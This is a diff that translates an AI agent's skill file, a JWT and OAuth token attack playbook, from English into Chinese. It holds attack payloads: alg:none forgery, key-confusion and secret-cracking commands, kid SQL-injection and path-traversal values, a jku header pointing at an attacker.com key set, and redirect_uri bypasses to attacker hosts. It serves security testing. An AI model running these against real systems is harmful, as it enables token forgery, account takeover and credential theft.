@@ -1,26 +1,26 @@
 ---
 name: jwt-oauth-token-attacks
 description: >-
-  JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
+  JWT 与 OAuth 令牌攻击手册。适用于验证令牌信任、签名算法、密钥处理、声明滥用、Bearer 流程以及 OAuth 账号绑定类弱点时。
 ---
 
-# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook
+# 技能：JWT 与 OAuth 2.0 令牌攻击 — 专家级攻击手册
 
-> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.
+> **AI 加载指令**：专家级认证令牌攻击。覆盖 JWT 密码学攻击（alg:none、RS256→HS256、密钥爆破、kid/jku 注入）、OAuth 流程攻击（CSRF、开放重定向、令牌窃取、隐式流程滥用）、PKCE 绕过，以及经由 Referer/日志的令牌泄露。这对现代 Web 应用至关重要。
 
-## 0. RELATED ROUTING
+## 0. 相关路由
 
-Use this file for token-centric attacks and flow abuse. Also load:
+本文件用于以令牌为中心的攻击与流程滥用。同时加载：
 
-- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
-- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
-- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC
+- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)（OAuth/OIDC 错误配置）：涉及重定向 URI、state、nonce、PKCE 与账号绑定校验
+- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md)（CORS 跨源错误配置）：当可能存在浏览器可读 API 或跨源令牌泄露时
+- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md)（SAML SSO 断言攻击）：当目标在 OAuth/OIDC 之外使用企业 SSO 时
 
 如果文件不存在的话通过搜索引擎去搜索下
 
 ---
 
-## 1. JWT ANATOMY
+## 1. JWT 结构剖析
 
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
@@ -28,7 +28,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.Sfl
          HEADER                     PAYLOAD                           SIGNATURE
 ```
 
-**Decode in terminal**:
+**在终端中解码**：
 ```bash
 echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
 # → {"alg":"HS256","typ":"JWT"}
@@ -37,7 +37,7 @@ echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
 # → {"userId":1234,"role":"user"}
 ```
 
-**Common claim targets** (modify to escalate):
+**常见声明篡改目标**（修改以提升权限）：
 ```json
 {
   "role": "admin",
@@ -52,9 +52,9 @@ echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
 
 ---
 
-## 2. ATTACK 1 — ALGORITHM NONE (alg:none)
+## 2. 攻击 1 — 算法置空（alg:none）
 
-Server doesn't validate signature when algorithm is "none"/"None"/"NONE":
+当算法为 "none"/"None"/"NONE" 时，服务器不校验签名：
 
 ```bash
 # Burp JWT Editor / python-jwt attack:
@@ -73,7 +73,7 @@ HEADER.PAYLOAD.
 HEADER.PAYLOAD
 ```
 
-**Tool (jwt_tool)**:
+**工具（jwt_tool）**：
 ```bash
 python3 jwt_tool.py JWT_TOKEN -X a
 # → automatically generates alg:none variants
@@ -81,11 +81,11 @@ python3 jwt_tool.py JWT_TOKEN -X a
 
 ---
 
-## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION
+## 3. 攻击 2 — RS256 转 HS256 密钥混淆
 
-**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
-- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
-- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**
+**当服务器使用 RS256 时**（非对称 — RSA 私钥签名、公钥验签）：
+- 服务器公钥通常可被发现（JWKS 端点、`/certs`、源码）
+- 攻击：告诉服务器"这是 HS256" → 服务器就会**把公钥当作密钥**校验 HS256 HMAC
 
 ```bash
 # Step 1: Obtain public key (PEM format)
@@ -103,9 +103,9 @@ python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem
 
 ---
 
-## 4. ATTACK 3 — JWT SECRET BRUTE FORCE
+## 4. 攻击 3 — JWT 密钥爆破
 
-HMAC-based JWTs (HS256/HS384/HS512) with weak secret:
+基于 HMAC 的 JWT（HS256/HS384/HS512）且密钥较弱时：
 
 ```bash
 # hashcat (fast):
@@ -119,7 +119,7 @@ john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
 python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
 ```
 
-**Common weak secrets to test manually**:
+**可手工测试的常见弱密钥**：
 ```
 secret, password, 123456, qwerty, changeme, your-256-bit-secret,
 APP_NAME, app_name, production, jwt_secret, SECRET_KEY
@@ -127,38 +127,38 @@ APP_NAME, app_name, production, jwt_secret, SECRET_KEY
 
 ---
 
-## 5. ATTACK 4 — kid (Key ID) INJECTION
+## 5. 攻击 4 — kid（Key ID）注入
 
-The `kid` header parameter specifies which key to use for verification. No sanitization = injection:
+`kid` 头部参数指定验签所用的密钥。没有过滤就等于注入：
 
-### kid SQL Injection
+### kid SQL 注入
 ```json
 {"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
 ```
-If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
-Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.
+若后端执行 SQL：`SELECT key FROM keys WHERE kid = 'INPUT'`  
+结果：HMAC 密钥 = `'attacker_controlled_key'` → 即可用该值伪造任意 payload 的签名。
 
-### kid Path Traversal (file read)
+### kid 路径遍历（文件读取）
 ```json
 {"alg":"HS256","kid":"../../../../dev/null"}
 ```
-Server reads `/dev/null` as key → empty string → sign token with empty HMAC.
+服务器把 `/dev/null` 当作密钥读取 → 得到空字符串 → 用空 HMAC 为令牌签名。
 
 ```json
 {"alg":"HS256","kid":"../../../../etc/hostname"}
 ```
-Server reads hostname as key → forge tokens signed with hostname string.
+服务器把 hostname 当作密钥读取 → 即可用 hostname 字符串为伪造令牌签名。
 
 ---
 
-## 6. ATTACK 5 — jku / x5u Header Injection
+## 6. 攻击 5 — jku / x5u 头部注入
 
-`jku` points to JSON Web Key Set URL. If not whitelisted:
+`jku` 指向 JSON Web Key Set 的 URL。若未做白名单校验：
 ```json
 {"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
 ```
 
-**Setup**:
+**准备工作**：
 ```bash
 # Generate RSA key pair:
 openssl genrsa -out private.pem 2048
@@ -175,16 +175,16 @@ import json, base64, struct
 # Server fetches attacker's JWKS → verifies with attacker's public key → accepts
 ```
 
-**jwt_tool automation**:
+**jwt_tool 自动化**：
 ```bash
 python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
 ```
 
 ---
 
-## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)
+## 7. OAuth 2.0 — 缺少 state 参数（CSRF）
 
-State parameter prevents CSRF in OAuth. If missing:
+state 参数用于在 OAuth 中防御 CSRF。若缺失：
 
 ```
 Attack:
@@ -199,11 +199,11 @@ Attack:
 
 ---
 
-## 8. OAUTH — REDIRECT_URI BYPASS
+## 8. OAuth — redirect_uri 绕过
 
-Authorization codes are sent to `redirect_uri`. If validation is weak:
+授权码会被发送到 `redirect_uri`。若校验不严：
 
-### Open Redirect in redirect_uri
+### redirect_uri 中的开放重定向
 ```
 Original: redirect_uri=https://target.com/callback
 Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
@@ -211,14 +211,14 @@ Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
           redirect_uri=https://target.com@attacker.com/callback
 ```
 
-### Partial Path Match
+### 部分路径匹配
 ```
 Whitelist: https://target.com/callback
 Attack: https://target.com/callback%2f../admin (URL path confusion)
         https://target.com/callbackXSS (prefix match only)
 ```
 
-### Localhost / Development Redirect
+### 本地 / 开发环境重定向
 ```
 redirect_uri=http://localhost/steal
 redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
@@ -226,19 +226,19 @@ redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
 
 ---
 
-## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT
+## 9. OAuth — 隐式流程令牌窃取
 
-Implicit flow: token sent in URL fragment `#access_token=...`
+隐式流程：令牌通过 URL fragment `#access_token=...` 返回
 
-**Fragment leakage scenarios**:
-- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
-- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page
+**Fragment 泄露场景**：
+- 重定向到攻击者页面：可通过 `document.referrer` 或目标页面中的 `<script>window.location.href</script>` 读取 fragment
+- 开放重定向：`redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → fragment 中的令牌最终落到攻击者页面
 
 ---
 
-## 10. OAUTH — SCOPE ESCALATION
+## 10. OAuth — 作用域提升
 
-Request broader scope than authorized in authorization code:
+请求比授权码中已授权范围更宽的 scope：
 ```
 Authorized scope: read:profile
 Attack: During token exchange, add scope=admin or scope=read:admin
@@ -247,10 +247,10 @@ Attack: During token exchange, add scope=admin or scope=read:admin
 
 ---
 
-## 11. TOKEN LEAKAGE VECTORS
+## 11. 令牌泄露途径
 
-### Referer Header
-Token in URL → page loads external resource → Referer leaks token:
+### Referer 头部
+令牌出现在 URL 中 → 页面加载外部资源 → Referer 泄露令牌：
 ```
 https://target.com/dashboard#access_token=TOKEN
 → HTML loads: <img src="https://analytics.third-party.com/track">
@@ -258,8 +258,8 @@ https://target.com/dashboard#access_token=TOKEN
 → analytics.third-party.com sees token in Referer logs
 ```
 
-### Server Logs
-Access tokens sent in query parameters are stored in:
+### 服务器日志
+通过查询参数发送的访问令牌会被记录在：
 ```
 /var/log/nginx/access.log
 /var/log/apache2/access.log
@@ -270,7 +270,7 @@ CDN logs
 
 ---
 
-## 12. JWT TESTING CHECKLIST
+## 12. JWT 测试清单
 
 ```
 □ Decode header + payload (base64 decode each part)
@@ -288,7 +288,7 @@ CDN logs
 
 ---
 
-## 13. OAUTH TESTING CHECKLIST
+## 13. OAuth 测试清单
 
 ```
 □ Check for state parameter in authorization request
